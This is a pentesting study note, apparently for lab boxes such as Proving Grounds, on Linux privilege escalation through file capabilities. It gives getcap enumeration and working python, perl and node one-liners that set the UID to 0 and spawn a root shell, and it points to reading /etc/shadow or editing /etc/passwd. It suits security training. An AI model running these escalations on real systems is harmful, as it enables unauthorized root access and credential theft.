Linux capabilities grant a binary a slice of root power without full SUID. A binary with `cap_setuid` can set its UID to 0 → root.
## Goal
Find a binary carrying an exploitable capability (`+ep`) and abuse it via GTFOBins.
## Tips
Only a few caps matter for root: cap_setuid (the big one), cap_setgid, cap_dac_override / cap_dac_read_search. Ignore the noise — ping's cap_net_raw is default and useless.

Checklist:
- [ ] getcap returns a binary with cap_setuid/setgid/dac_*?
- [ ] does it have `+ep`?
- [ ] is it NOT just ping (cap_net_raw)?
- [ ] binary on GTFOBins "Capabilities" tab?
# Commands

### Step 1: find caps
```bash
getcap -r / 2>/dev/null      # all file capabilities
```

### Step 2: linpeas
```bash
# linpeas: "Capabilities" -> "Files with capabilities"
# ignore CapBnd bitmasks + root processes (normal noise)
```

## Exploit
### Case 1: cap_setuid
**Enumerate:**
```bash
getcap -r / 2>/dev/null
# if you see something like:
/usr/bin/python3.8 = cap_setuid+ep    # <- ROOT
/usr/bin/perl = cap_setuid+ep
```
**Exploit:**
```bash
# GTFOBins "Capabilities" tab for that binary:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
# -> root
# seen on: multiple Proving Grounds boxes
```

### Case 2: cap_dac_* (read/write any file)
**Enumerate:**
```bash
getcap -r / 2>/dev/null
# cap_dac_read_search+ep  -> read ANY file (e.g. /etc/shadow)
# cap_dac_override+ep     -> write ANY file (e.g. /etc/passwd)
```
**Exploit:**
```bash
# read shadow (binary w/ the cap) -> crack root
# OR override /etc/passwd to add a UID-0 user -> see [[02_etc_passwd_shadow]]
```

### Case 3: other cap_setuid binary
**Enumerate:**
```bash
getcap -r / 2>/dev/null    # node / ruby / php / gdb with cap_setuid+ep
```
**Exploit:**
```bash
node -e 'process.setuid(0);require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
# check GTFOBins "Capabilities" for the exact binary
```

## Helpline:
1. What a capability is
```
a slice of root power on ONE binary, without full SUID.
cap_setuid = can become any UID incl 0 = root.
```

2. The +ep suffix
```
e=effective, p=permitted. +ep = ACTIVE.
exploitable: cap_setuid, cap_setgid, cap_dac_override, cap_dac_read_search,
cap_sys_admin, cap_sys_ptrace, cap_chown.
```

3. Ignore the noise
```
cap_net_raw+ep on /usr/bin/ping = DEFAULT, not a vector.
cap_net_bind_service = default. CapBnd bitmasks = normal.
ONLY "Files with capabilities" lines on odd binaries matter.
```

4. GTFOBins Capabilities tab
```
cap_setuid binaries usually: python, perl, ruby, node, php, gdb.
```
